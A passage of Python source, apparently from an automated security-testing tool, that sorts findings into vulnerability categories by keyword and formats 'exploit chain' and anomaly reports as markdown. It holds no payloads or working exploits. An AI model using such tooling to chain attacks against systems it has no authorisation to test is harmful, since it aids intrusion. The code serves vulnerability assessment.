        return chains

    def _categorize_findings(self, findings: List[Dict[str, Any]]) -> Dict[str, List[Dict[str, Any]]]:
        """Categorize findings by vulnerability type for chain analysis."""
        categories: Dict[str, List[Dict[str, Any]]] = {}
        keyword_map = {
            "ssrf": ["ssrf", "server-side request", "url fetch", "redirect"],
            "sqli": ["sql injection", "sqli", "sql error", "database"],
            "xss": ["xss", "cross-site scripting", "script injection"],
            "lfi": ["local file inclusion", "lfi", "file inclusion", "path traversal", "directory traversal"],
            "rce": ["remote code execution", "rce", "command injection", "code execution"],
            "csrf": ["csrf", "cross-site request forgery", "no csrf"],
            "auth_weakness": ["brute", "weak password", "no lockout", "default credential", "authentication bypass"],
            "info_disclosure": ["information disclosure", "version disclosure", "directory listing", "source code", "backup file"],
            "file_write": ["file upload", "file write", "arbitrary file", "unrestricted upload"],
            "log_access": ["log file", "access log", "error log"],
            "internal_service": ["internal", "redis", "memcache", "docker", "kubernetes", "consul", "etcd"],
            "open_redirect": ["open redirect", "url redirect", "unvalidated redirect"],
            "deserialization": ["deserialization", "unserialize", "pickle", "marshal"],
        }

        for finding in findings:
            title_lower = (finding.get("title", "") + " " + finding.get("description", "")).lower()
            for cat, keywords in keyword_map.items():
                if any(kw in title_lower for kw in keywords):
                    categories.setdefault(cat, []).append(finding)

        return categories

    # ── Enrichment for Tool Results ──────────────────────────────────

    def enrich_tool_output(self, tool_output: str, tool_name: str = "") -> str:
        """
        Analyze tool output for zero-day signals and return enrichment text.
        This is called automatically after every tool execution.
        """
        anomalies = self.analyze_response(tool_output)
        if not anomalies:
            return ""

        lines = ["\n## 🔬 Zero-Day Analysis\n"]
        lines.append(f"**{len(anomalies)} anomaly signal(s) detected in output:**\n")

        for a in anomalies[:10]:  # Cap display
            icon = {"Critical": "🔴", "High": "🟠", "Medium": "🟡", "Low": "🔵", "Info": "⚪"}.get(a.severity, "⚪")
            lines.append(
                f"- {icon} **[{a.category}]** {a.description} "
                f"(confidence: {a.confidence:.0%})"
            )
            lines.append(f"  - 💡 *{a.exploit_potential[:200]}*")

        if len(anomalies) > 10:
            lines.append(f"\n*... and {len(anomalies) - 10} more signals*")

        return "\n".join(lines)

    # ── Formatting ──────────────────────────────────────────────────

    @staticmethod
    def format_chains_report(chains: List[ExploitChain]) -> str:
        """Format exploit chains as markdown."""
        if not chains:
            return "## Exploit Chain Analysis\n\nNo viable exploit chains identified from current findings."

        lines = [
            "## ⛓️ Exploit Chain Analysis\n",
            f"**{len(chains)} potential exploit chains identified:**\n",
        ]

        for i, chain in enumerate(chains, 1):
            sev_icon = {"Critical": "🔴", "High": "🟠", "Medium": "🟡"}.get(chain.overall_severity, "⚪")
            lines.append(f"### {i}. {sev_icon} {chain.title}")
            lines.append(f"**Impact:** {chain.overall_impact}")
            lines.append(f"**Severity:** {chain.overall_severity} | **Likelihood:** {chain.likelihood}\n")

            lines.append("**Attack Path:**")
            for j, step in enumerate(chain.chain_steps, 1):
                lines.append(f"  {j}. **{step['finding']}** → {step['technique']} → *{step['outcome']}*")

            if chain.prerequisites:
                lines.append(f"\n**Prerequisites:** {', '.join(chain.prerequisites)}")
            if chain.mitigations:
                lines.append(f"**Mitigations:** {', '.join(chain.mitigations)}")
            lines.append("")

        return "\n".join(lines)

    @staticmethod
    def format_anomalies_report(anomalies: List[AnomalySignal]) -> str:
        """Format anomaly signals as markdown."""
        if not anomalies:
            return ""

        lines = ["## 🔬 Response Anomaly Report\n"]
        by_severity: Dict[str, List[AnomalySignal]] = {}
        for a in anomalies:
            by_severity.setdefault(a.severity, []).append(a)

        for severity in ["Critical", "High", "Medium", "Low", "Info"]:
            group = by_severity.get(severity, [])
            if not group:
                continue
            icon = {"Critical": "🔴", "High": "🟠", "Medium": "🟡", "Low": "🔵", "Info": "⚪"}[severity]
            lines.append(f"### {icon} {severity} ({len(group)})\n")
            for a in group:
                lines.append(f"- **{a.indicator}**")
                lines.append(f"  - {a.description}")
                lines.append(f"  - Evidence: `{a.evidence[:100]}`")
                lines.append(f"  - 💡 {a.exploit_potential[:200]}")
            lines.append("")

        return "\n".join(lines)
